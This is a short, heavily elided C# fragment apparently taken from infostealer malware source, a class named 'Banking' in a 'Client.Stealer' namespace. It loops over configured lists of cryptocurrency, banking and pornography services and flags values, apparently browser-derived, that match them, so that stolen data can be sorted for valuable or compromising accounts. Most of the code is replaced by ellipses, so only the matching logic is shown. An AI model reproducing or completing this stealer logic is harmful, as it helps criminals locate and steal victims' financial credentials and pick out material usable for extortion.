...
namespace Client.Stealer
{
    internal sealed class Banking
    {
        ...
        {
            foreach (string service in Client.BrowserConfig.Config.CryptoServices)
        ...
        {
            foreach (string service in Client.BrowserConfig.Config.BankingServices)
                if (value.ToLower().Contains(service) && value.Length < 25)
        ...
        {
            foreach (string service in Client.BrowserConfig.Config.PornServices)
                if (value.ToLower().Contains(service) && value.Length < 25)
